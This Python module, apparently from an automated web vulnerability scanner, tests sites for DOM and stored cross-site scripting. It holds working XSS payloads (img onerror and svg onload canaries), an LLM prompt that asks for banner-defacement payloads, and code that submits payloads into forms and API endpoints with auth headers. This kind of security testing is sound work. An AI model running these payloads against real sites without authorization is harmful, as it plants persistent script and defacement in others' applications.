"""
DOM loop and stored XSS imperative shell.

Shell mixin extracted from xss_agent.py (hard max 1500 LOC per module for agent work).
"""
from __future__ import annotations

# --- shell runtime deps (mixin methods used these from xss_agent module scope) ---
import asyncio
import aiohttp
import json
import re
import urllib.parse
import html as html_module
from dataclasses import asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union, Iterable

from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.core.llm_client import llm_client
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.verbose_events import create_emitter
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation, get_validation_status
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.tools.visual.verifier import XSSVerifier
from bugtrace.tools.headless import detect_dom_xss, detect_dom_xss_batch
from bugtrace.tools.external import external_tools
from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
from bugtrace.utils.payload_amplifier import PayloadAmplifier
from bugtrace.memory.payload_learner import PayloadLearner
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
from bugtrace.tools.manipulator.context_analyzer import ContextAnalyzer, ReflectionContext
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
    get_default_severity,
)
from bugtrace.agents.xss import coverage as xss_coverage
from bugtrace.agents.xss.types import XSSFinding, InjectionContext, ValidationMethod
from bugtrace.agents.xss.constants import (
    PROBE_STRING,
    PROBE_STRING_SAFE,
    OMNIPROBE_PAYLOAD,
    GOLDEN_PAYLOADS,
    FRAGMENT_PAYLOADS,
)
from bugtrace.agents.xss.finding_builder import (
    mask_auth_headers as _mask_auth_headers,
    auth_meta as _auth_meta,
    excerpt_around as _excerpt_around,
    build_raw_http as _build_raw_http,
    promote_repro as _promote_repro,
)
from bugtrace.agents.xss.waf import (
    detect_payload_encoding as _pure_detect_payload_encoding,
    record_bypass_result as _pure_record_bypass_result,
    get_waf_optimized_payloads as _pure_get_waf_optimized_payloads,
)
logger = get_logger(__name__)
from bugtrace.agents.xss.shell_constants import (
    _BROWSER_ONLY_CONTEXTS,
    _CDP_PROOF_LOCK,
    _L05_CHAR_PROBE,
    _LEGACY_PROBE_MARKER,
    _PROBE_NO_REFLECTION,
    _PROBE_NO_RESPONSE,
    _PROBE_REFLECTED,
    _REDIRECT_PARAM_SET,
    _REFLECTION_SNIPPET_RADIUS,
)
from bugtrace.agents.xss.context_reflection import as_context_set as _as_context_set
# --- end shell runtime deps ---

class XSSDomStoredFlowMixin:
    async def _loop_test_dom_xss(self, screenshots_dir: Path = None):
        """
        Phase 3.5: DOM XSS Headless scan with VISUAL VALIDATION.

        Flow:
        1. detect_dom_xss() finds DOM XSS candidates
        2. For each candidate, validate visually with screenshot + Vision AI
        3. Only CONFIRMED if Vision sees execution proof
        """
        dashboard.log(f"[{self.name}] 🎭 Starting DOM XSS Headless Scan...", "INFO")
        logger.info(f"[{self.name}] Phase 3.5: DOM XSS Headless Scan")

        try:
            # Collect URLs to test: self.url + internal links + recon URLs with params
            urls_to_test = [self.url]
            if hasattr(self, '_discovered_internal_urls') and self._discovered_internal_urls:
                urls_to_test.extend(self._discovered_internal_urls)

            # SPRINT-2 (2026-02-12): Expand to recon URLs from GoSpider
            # Only add URLs with query params (they have injectable surfaces)
            recon_urls = self._load_recon_urls_with_params()
            if recon_urls:
                existing = set(urls_to_test)
                added = 0
                for rurl in recon_urls:
                    if rurl not in existing:
                        urls_to_test.append(rurl)
                        existing.add(rurl)
                        added += 1
                if added:
                    logger.info(f"[{self.name}] 🔍 Added {added} recon URLs for DOM XSS testing")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.dom.started", {"url": self.url, "urls_count": len(urls_to_test)})
            logger.info(f"[{self.name}] DOM XSS scanning {len(urls_to_test)} URLs")

            # Gap 3 Fix: Pass discovered param names so DOM XSS tests each param individually
            # (e.g., ?back=CANARY, ?searchTerm=CANARY) instead of only ?xss=CANARY
            discovered_param_names = None
            if hasattr(self, '_discovered_params') and self._discovered_params:
                discovered_param_names = list(self._discovered_params.keys())
            elif hasattr(self, '_last_all_params') and self._last_all_params:
                discovered_param_names = list(self._last_all_params.keys())

            # Single browser for ALL urls. Previously each url called detect_dom_xss(),
            # which launches+closes Chromium every time — a ~1-2s cold start per url that
            # dominated slow scans (browser restarted for each of N urls). The batch keeps
            # one browser open; a per-url timeout still skips a hanging url without tearing
            # the shared browser down.
            dom_findings = []
            try:
                dom_findings = await detect_dom_xss_batch(
                    urls_to_test,
                    discovered_params=discovered_param_names,
                    per_url_timeout=180,
                )
            except Exception as e:
                logger.debug(f"[{self.name}] DOM XSS batch scan failed: {e}")

            if not dom_findings:
                dashboard.log(f"[{self.name}] No DOM XSS candidates found across {len(urls_to_test)} URLs", "INFO")
                return

            dashboard.log(
                f"[{self.name}] 🔍 Found {len(dom_findings)} DOM XSS candidates from {len(urls_to_test)} URLs, validating visually...",
                "INFO"
            )

            confirmed_count = 0
            skipped_count = 0

            for df in dom_findings:
                sink = df.get("sink", "")
                source_str = df.get("source", "unknown")
                payload = df.get("payload", "")
                param_name = source_str.split(":")[-1] if ":" in source_str else source_str

                # --- FP filtering: reject findings that don't prove execution ---

                # 1. Canary-only payloads: a plain string reaching innerHTML is NOT XSS.
                #    Real XSS requires HTML/JS execution (e.g., <script>, onerror=, javascript:)
                canary_base = "BUGTRACEAI_7x7"
                payload_stripped = payload.replace(canary_base, "").replace("|", "").replace(param_name, "").strip()
                is_canary_only = not payload_stripped or payload_stripped in ("", "|")
                if is_canary_only and sink != "alert":
                    skipped_count += 1
                    logger.info(f"[{self.name}] DOM XSS FP filtered: canary-only payload in {sink} sink (param: {param_name})")
                    continue

                # 2. postMessage self-send: scanner sends its own message, doesn't prove
                #    cross-origin exploitability. Reject unless alert() actually fired.
                if source_str == "window.postMessage" and sink != "alert":
                    skipped_count += 1
                    logger.info(f"[{self.name}] DOM XSS FP filtered: postMessage self-send to {sink} sink")
                    continue

                # 3. Static analysis patterns: regex source→sink matching without execution proof.
                if "source-to-sink pattern detected" in payload.lower() or "static analysis" in str(df.get("evidence", "")).lower():
                    skipped_count += 1
                    logger.info(f"[{self.name}] DOM XSS FP filtered: static analysis pattern, no execution proof")
                    continue

                # --- Passed FP filters: this is a real DOM XSS finding ---
                confirmed_count += 1
                self.findings.append(XSSFinding(
                    url=df["url"],
                    parameter=param_name,
                    payload=payload,
                    context="dom_xss",
                    validation_method="dom_xss_hook_confirmed",
                    evidence={
                        "sink": sink,
                        "source": source_str,
                        "hook_confirmed": True,
                        "validation_note": f"Payload reached {sink} sink — confirmed by Playwright runtime hook"
                    },
                    confidence=0.95,
                    status="VALIDATED_CONFIRMED",
                    validated=True,
                    reflection_context=source_str,
                    successful_payloads=[payload]
                ))
                dashboard.log(
                    f"[{self.name}] ✅ DOM XSS CONFIRMED via hook: {sink} (param: {param_name})",
                    "SUCCESS"
                )

            if skipped_count > 0:
                dashboard.log(
                    f"[{self.name}] 🛡️ DOM XSS: filtered {skipped_count}/{len(dom_findings)} false positives (canary-only/self-send/static)",
                    "INFO"
                )

            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.dom.result", {"url": self.url, "candidates": len(dom_findings), "confirmed": confirmed_count})

            if confirmed_count > 0:
                dashboard.log(
                    f"[{self.name}] 🎯 DOM XSS: {confirmed_count}/{len(dom_findings)} confirmed!",
                    "SUCCESS"
                )
            else:
                dashboard.log(
                    f"[{self.name}] ⚠️ DOM XSS: {len(dom_findings)} candidates, 0 confirmed",
                    "WARN"
                )

        except Exception as e:
            logger.error(f"[{self.name}] DOM XSS Headless Scan failed: {e}", exc_info=True)
            dashboard.log(f"[{self.name}] ⚠️ DOM XSS Scan skipped: Headless error", "WARN")

    async def _validate_dom_xss_visually(
        self,
        url: str,
        payload: str,
        sink: str,
        source: str,
        screenshots_dir: Path = None
    ) -> Optional[Dict[str, Any]]:
        """
        Validate DOM XSS candidate with screenshot + Vision AI.

        This is the BULLETPROOF validation:
        1. Navigate to URL (payload already in URL from detector)
        2. Capture screenshot
        3. Vision AI confirms: "Do you see alert/XSS execution?"

        Returns:
            Evidence dict with vision_confirmed=True if validated, None otherwise
        """
        try:
            # Use verifier with screenshot capture
            screenshot_path = None
            if screenshots_dir:
                screenshots_dir = Path(screenshots_dir)
                screenshots_dir.mkdir(parents=True, exist_ok=True)

            result = await self.verifier.verify_xss(
                url=url,
                screenshot_dir=str(screenshots_dir) if screenshots_dir else None,
                timeout=10.0,
                max_level=3
            )

            evidence = {
                "sink": sink,
                "source": source,
                "detector_found": True,
                "playwright_tested": True
            }

            if result and result.screenshot_path:
                evidence["screenshot_path"] = result.screenshot_path

                # Vision AI validation
                await self._run_vision_validation(
                    screenshot_path=result.screenshot_path,
                    attack_url=url,
                    payload=payload,
                    evidence=evidence
                )

            if result and result.success:
                evidence["playwright_confirmed"] = True
                # If Playwright confirmed but no Vision, still consider it
                # but with lower confidence
                if not evidence.get("vision_confirmed"):
                    evidence["validation_note"] = "Playwright confirmed, Vision not available"

            return evidence if (evidence.get("vision_confirmed") or evidence.get("playwright_confirmed")) else None

        except Exception as e:
            logger.error(f"[{self.name}] DOM XSS visual validation failed: {e}")
            return None

    async def _try_alternative_dom_payloads(
        self,
        url: str,
        sink: str,
        source: str,
        original_payload: str,
        screenshots_dir: Path = None
    ) -> Optional[Dict[str, Any]]:
        """
        Generate and test alternative payloads when original doesn't work visually.

        Uses DeepSeek to generate 10 visual payloads for the specific sink/source
        combination, then tests each until one is visually confirmed.

        Args:
            url: Base URL (without payload)
            sink: DOM sink (e.g., "eval", "innerHTML")
            source: DOM source (e.g., "postMessage", "location.hash")
            original_payload: The payload that didn't work
            screenshots_dir: Directory for screenshots

        Returns:
            Evidence dict with working_payload if found, None otherwise
        """
        from bugtrace.core.llm_client import llm_client
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        dashboard.log(
            f"[{self.name}] 🎨 Generating alternative payloads for {sink}...",
            "INFO"
        )

        # Generate visual payloads via DeepSeek
        prompt = f"""You are a DOM XSS expert. I found a DOM XSS vulnerability:
- Sink: {sink}
- Source: {source}
- Original payload that was detected but not visually confirmed: {original_payload[:100]}

Generate exactly 10 XSS payloads that will:
1. Exploit this specific sink ({sink}) via the source ({source})
2. Create a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"

CRITICAL: Use BACKTICKS (`) instead of quotes for all strings to avoid escaping issues!

Working example for eval sink (uses backticks):
var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);

Working example for innerHTML sink:
<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>

Adapt the payload to work with the {sink} sink:
- For eval/Function: use backticks for strings, create div via DOM API
- For innerHTML/outerHTML: inject div HTML directly
- For document.write: write the full div HTML
- For postMessage: craft message payload with backticks

Return ONLY the payloads, one per line, no explanations."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                module_name="DOM-XSS-AltPayloads",
                model_override=settings.MUTATION_MODEL,
                temperature=0.7,
                max_tokens=2000
            )

            if not response:
                return {"attempts": 0, "error": "LLM returned empty response"}

            # Parse payloads
            payloads = []
            for line in response.strip().split("\n"):
                line = line.strip()
                if line and not line.startswith("#") and len(line) > 5:
                    # Remove numbering
                    if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                        line = line[2:].strip()
                    payloads.append(line)

            payloads = payloads[:10]  # Max 10

            if not payloads:
                return {"attempts": 0, "error": "No payloads generated"}

            dashboard.log(
                f"[{self.name}] Testing {len(payloads)} alternative payloads...",
                "INFO"
            )

            # Test each payload
            for i, payload in enumerate(payloads):
                dashboard.set_current_payload(
                    f"ALT [{i+1}/{len(payloads)}]",
                    "DOM XSS Alt",
                    "Testing"
                )

                # Build URL with payload
                # For DOM XSS, payload often goes in hash or specific param
                parsed = urlparse(url)
                if source == "location.hash":
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"
                elif source == "postMessage":
                    # postMessage needs different approach - use original URL
                    # and inject via script
                    test_url = url
                else:
                    # Try in query string — use param name from source if available
                    params = parse_qs(parsed.query)
                    # Extract param name from source (e.g., "param:returnPath" → "returnPath")
                    if source and ":" in source:
                        param_name = source.split(":")[-1]
                    elif source and source.startswith("location."):
                        param_name = list(params.keys())[0] if params else "input"
                    else:
                        param_name = list(params.keys())[0] if params else "input"
                    params[param_name] = [payload]
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode(params, doseq=True), parsed.fragment
                    ))

                # Validate visually
                evidence = await self._validate_dom_xss_visually(
                    url=test_url,
                    payload=payload,
                    sink=sink,
                    source=source,
                    screenshots_dir=screenshots_dir
                )

                if evidence and evidence.get("vision_confirmed"):
                    evidence["working_payload"] = payload
                    evidence["attempts"] = i + 1
                    evidence["total_alternatives"] = len(payloads)
                    return evidence

            # None worked
            return {"attempts": len(payloads), "error": "No payload visually confirmed"}

        except Exception as e:
            logger.error(f"[{self.name}] Alternative payload generation failed: {e}")
            return {"attempts": 0, "error": str(e)}

    async def _test_stored_xss(self, screenshots_dir: Path = None) -> List[Dict]:
        """
        Test for stored XSS by submitting payloads via POST then checking GET pages.

        Enhanced workflow:
        1. Discover POST targets: HTML forms + common API write endpoints
        2. Submit XSS payloads via POST (form-encoded AND JSON)
        3. Extract resource ID from POST response
        4. Build detail URLs (e.g., /api/reviews/{id}) and check for stored payload
        5. Check canary in raw text, JSON values, and HTML responses
        """
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, urljoin
        from bs4 import BeautifulSoup
        import re

        findings = []
        canary = f"BTXSS{int(__import__('time').time()) % 10000}"
        stored_payloads = [
            f"<img src=x onerror=document.title='{canary}'>",
            f"<svg onload=document.title='{canary}'>",
            f'"><img src=x onerror=document.title=\'{canary}\'>',
        ]

        parsed_url = urlparse(self.url)
        base = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # Get auth headers for authenticated write endpoints
        auth_headers = {}
        try:
            from bugtrace.services.scan_context import get_scan_auth_headers
            auth_headers = get_scan_auth_headers(self._scan_context, role="user") or {}
        except Exception:
            pass

        # ========== Phase A: Discover POST targets ==========
        post_targets = []

        # A1: HTML form discovery
        try:
            state = await browser_manager.capture_state(self.url)
            html = state.get("html", "")
        except Exception:
            html = ""

        if html:
            soup = BeautifulSoup(html, "html.parser")
            for form in soup.find_all("form"):
                method = (form.get("method", "GET") or "GET").upper()
                if method != "POST":
                    continue
                action = form.get("action", "")
                form_url = urljoin(self.url, action) if action else self.url

                fields = {}
                text_fields = []
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if not name:
                        continue
                    input_type = (inp.get("type", "text") or "text").lower()
                    if input_type in ("submit", "button", "reset", "file", "image"):
                        continue
                    default = inp.get("value", "")
                    fields[name] = default
                    if input_type in ("text", "search", "url", "email") or inp.name == "textarea":
                        text_fields.append(name)
                    elif input_type == "hidden" and "csrf" not in name.lower() and "token" not in name.lower():
                        text_fields.append(name)

                if text_fields and fields:
                    post_targets.append({
                        "url": form_url,
                        "fields": fields,
                        "text_fields": text_fields,
                        "format": "form",
                    })

        # A2+A3: GENERIC API write-endpoint discovery. Instead of hardcoded BugStore/PortSwigger
        # paths + fixed field schemas, take the recon-discovered API-ish endpoints and learn each
        # one's required schema from the server's OWN 400/422 validation errors (target-agnostic).
        content_field_names = ["comment", "content", "body", "text", "message",
                               "description", "title", "review", "feedback", "post"]
        discovered_api_urls = set(t["url"] for t in post_targets)

        # Candidate write endpoints = same-host recon URLs that look like API endpoints.
        _recon_urls = getattr(self, 'urls_to_scan', None) or []
        _api_candidates, _seen = [], set()
        for _u in _recon_urls:
            try:
                _pu = urlparse(_u)
            except Exception:
                continue
            if _pu.netloc != parsed_url.netloc or "/api/" not in _pu.path.lower():
                continue
            _canon = f"{_pu.scheme}://{_pu.netloc}{_pu.path.rstrip('/')}"
            if _canon in _seen or _canon in discovered_api_urls:
                continue
            _seen.add(_canon)
            _api_candidates.append(_canon)

        # Learn each candidate's schema from its validation errors (cap to stay cheap/quiet).
        for _api_url in _api_candidates[:10]:
            _target = await self._discover_write_schema(_api_url, auth_headers, content_field_names)
            if _target:
                _tkey = _target["url"].split("?")[0].rstrip("/")
                if _tkey not in discovered_api_urls:
                    post_targets.append(_target)
                    discovered_api_urls.add(_tkey)

        if not post_targets:
            return findings

        logger.info(f"[{self.name}] Stored XSS: {len(post_targets)} POST targets "
                     f"({sum(1 for t in post_targets if t['format'] == 'form')} forms, "
                     f"{sum(1 for t in post_targets if t['format'] == 'json')} API)")

        # ========== Phase B: Write-then-Read testing ==========
        for target in post_targets[:8]:
            form_url = target["url"]
            fields = target["fields"]
            text_fields = target["text_fields"]
            fmt = target["format"]
            target_auth_failed = False

            for target_field in text_fields[:2]:
                if target_auth_failed:
                    break
                for payload in stored_payloads:
                    try:
                        submit_data = dict(fields)
                        submit_data[target_field] = payload
                        post_response_text = ""
                        post_status = 0

                        # Submit payload
                        async with http_manager.session(ConnectionProfile.PROBE) as session:
                            req_headers = {
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                **auth_headers,
                            }
                            if fmt == "json":
                                req_headers["Content-Type"] = "application/json"
                                async with session.post(
                                    form_url, json=submit_data, ssl=False,
                                    headers=req_headers,
                                    allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=8)
                                ) as resp:
                                    post_status = resp.status
                                    post_response_text = await resp.text()
                            else:
                                async with session.post(
                                    form_url, data=submit_data, ssl=False,
                                    headers=req_headers,
                                    allow_redirects=True,
                                    timeout=aiohttp.ClientTimeout(total=8)
                                ) as resp:
                                    post_status = resp.status
                                    post_response_text = await resp.text()

                        # Capture the injection POST (seed enrichment) — auth masked.
                        import json as _json
                        from urllib.parse import urlencode as _urlencode
                        _pbody = _json.dumps(submit_data) if fmt == "json" else _urlencode(submit_data)
                        _pct = "application/json" if fmt == "json" else "application/x-www-form-urlencoded"
                        post_request = {"method": "POST", "url": form_url, "headers": _mask_auth_headers(req_headers), "body": _pbody, "body_content_type": _pct}
                        post_auth = _auth_meta(auth_headers)

                        # Log POST result for debugging
                        logger.info(f"[{self.name}] Stored XSS POST {form_url} field={target_field}: HTTP {post_status}")

                        # Skip auth-gated endpoints we can't access
                        if post_status in (401, 403):
                            logger.info(f"[{self.name}] Stored XSS: auth required for POST {form_url} (HTTP {post_status})")
                            target_auth_failed = True
                            break
                        if post_status >= 500:
                            continue

                        # Check 1: POST response itself may contain the stored payload
                        if post_status in (200, 201) and self._check_stored_canary(post_response_text, canary, payload):
                            findings.append({
                                "type": "XSS",
                                "subtype": "STORED_XSS",
                                "url": form_url,
                                "parameter": target_field,
                                "payload": payload,
                                "context": "stored_xss",
                                "evidence": {
                                    "validated": True,
                                    "level": "stored",
                                    "post_url": form_url,
                                    "check_url": form_url,
                                    "xss_type": "stored",
                                    "validation_method": "post_response_reflection",
                                    "resource_id": self._extract_resource_id(post_response_text),
                                    "confirming_request": post_request,
                                    "readback_request": None,
                                    "repro_auth": post_auth,
                                    "capture_method": "stored_xss_post_get",
                                },
                                "repro": {
                                    "confirming_request": post_request,
                                    "confirming_response": None,
                                    "readback_request": None,
                                    "auth": post_auth,
                                    "capture_method": "stored_xss_post_get",
                                },
                                "http_request": _build_raw_http(post_request),
                                "confidence": 0.95,
                                "validated": True,
                                "status": "VALIDATED_CONFIRMED",
                                "http_method": "POST",
                            })
                            logger.info(f"[{self.name}] STORED XSS CONFIRMED: payload reflected in POST response at {form_url}")
                            break

                        # Build check URLs: original page + form URL + detail URL from response
                        check_urls = [self.url]
                        if form_url != self.url:
                            check_urls.append(form_url)

                        # Extract resource ID from POST response to build detail URL
                        resource_id = self._extract_resource_id(post_response_text)
                        if resource_id:
                            detail_url = f"{form_url.rstrip('/')}/{resource_id}"
                            check_urls.append(detail_url)

                        # Also check the list endpoint (payload may render on list page)
                        list_url = form_url.rstrip("/")
                        if list_url not in check_urls:
                            check_urls.append(list_url)

                        # Check each URL for stored payload
                        for check_url in check_urls:
                            try:
                                async with http_manager.session(ConnectionProfile.PROBE) as session:
                                    async with session.get(
                                        check_url, ssl=False,
                                        headers={**auth_headers},
                                        timeout=aiohttp.ClientTimeout(total=5)
                                    ) as resp:
                                        body = await resp.text()
                            except Exception:
                                continue

                            # Check for canary in response (multiple formats)
                            if self._check_stored_canary(body, canary, payload):
                                _readback = {"method": "GET", "url": check_url, "headers": _mask_auth_headers(dict(auth_headers)), "body": None, "body_content_type": None}
                                findings.append({
                                    "type": "XSS",
                                    "subtype": "STORED_XSS",
                                    "url": check_url,
                                    "parameter": target_field,
                                    "payload": payload,
                                    "context": "stored_xss",
                                    "evidence": {
                                        "validated": True,
                                        "level": "stored",
                                        "post_url": form_url,
                                        "check_url": check_url,
                                        "xss_type": "stored",
                                        "validation_method": "http_response_analysis",
                                        "resource_id": resource_id,
                                        "confirming_request": post_request,
                                        "readback_request": _readback,
                                        "repro_auth": post_auth,
                                        "capture_method": "stored_xss_post_get",
                                    },
                                    "repro": {
                                        "confirming_request": post_request,
                                        "confirming_response": None,
                                        "readback_request": _readback,
                                        "auth": post_auth,
                                        "capture_method": "stored_xss_post_get",
                                    },
                                    "http_request": _build_raw_http(post_request),
                                    "confidence": 0.95,
                                    "validated": True,
                                    "status": "VALIDATED_CONFIRMED",
                                    "http_method": "POST",
                                })
                                logger.info(f"[{self.name}] STORED XSS CONFIRMED: POST {form_url} field '{target_field}' → stored on GET {check_url}")
                                break
                        if findings and findings[-1].get("parameter") == target_field:
                            break
                    except Exception as e:
                        logger.debug(f"[{self.name}] Stored XSS test failed: {e}")
                        continue

        return findings

    async def _llm_smart_dom_analysis(
        self,
        html: str,
        param: str,
        probe_string: str,
        interactsh_url: str,
        context_data: Dict
    ) -> List[Dict]:
        """
        LLM-First Strategy: Analyze DOM structure and generate targeted payloads.

        Instead of trying 50+ generic payloads, the LLM:
        1. Parses the exact DOM structure around the reflection point
        2. Identifies what tags/attributes need to be escaped
        3. Generates 1-3 precision payloads for the exact context

        Returns:
            List of payload dicts with: payload, reasoning, confidence
        """
        dom_snippet = self._extract_dom_around_reflection(html, probe_string)

        system_prompt = self._dom_build_system_prompt()
        user_prompt = self._dom_build_user_prompt(
            html, param, probe_string, interactsh_url, context_data, dom_snippet
        )

        try:
            response = await self._dom_call_llm(system_prompt, user_prompt)

            if not response:
                logger.warning(f"[{self.name}] LLM Smart Analysis returned empty response")
                return []

            payloads = self._parse_smart_analysis_response(response, interactsh_url)

            if payloads:
                self._dom_log_generated_payloads(payloads)

            return payloads

        except Exception as e:
            logger.error(f"[{self.name}] LLM Smart Analysis failed: {e}", exc_info=True)
            return []

    async def _discover_write_schema(self, api_url, auth_headers, content_field_names):
        """Learn a write endpoint's required schema from its OWN 400/422 validation errors, then
        return a stored-XSS POST target. Target-agnostic: no hardcoded paths or field names — the
        server tells us which fields it requires. Returns None if the endpoint doesn't accept writes.
        """
        async def _post(u, body):
            try:
                async with http_manager.session(ConnectionProfile.PROBE) as s:
                    async with s.post(
                        u, json=body, ssl=False,
                        headers={**auth_headers, "Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=4),
                    ) as r:
                        try:
                            j = await r.json()
                        except Exception:
                            j = {}
                        return r.status, j
            except Exception:
                return None, {}

        # Pick the URL variant (with/without trailing slash) that actually accepts POST.
        chosen = None
        for u in (api_url, api_url + "/"):
            st, _ = await _post(u, {"comment": ""})
            if st in (200, 201, 400, 422):
                chosen = u
                break
        if not chosen:
            return None

        # Iteratively learn required fields from the server's validation errors. Start from an
        # EMPTY body so the server enumerates exactly what it needs (avoids assuming any schema).
        fields, text_fields = {}, []
        for _ in range(4):
            st, err = await _post(chosen, dict(fields))
            if st in (200, 201):
                break
            if st in (400, 422):
                added = False
                for detail in (err.get("detail") or []):
                    loc = detail.get("loc", []) if isinstance(detail, dict) else []
                    fname = loc[-1] if loc else None
                    if isinstance(fname, str) and fname not in fields and fname.lower() != "body":
                        fields[fname] = "1"
                        if fname.lower() in content_field_names:
                            text_fields.append(fname)
                        added = True
                if not added:
                    break
            else:
                return None

        if not text_fields:
            # Accepts writes but exposed no content-like field name — inject into a generic one.
            fields.setdefault("comment", "")
            text_fields = ["comment"]
        return {"url": chosen, "fields": fields, "text_fields": text_fields, "format": "json"}

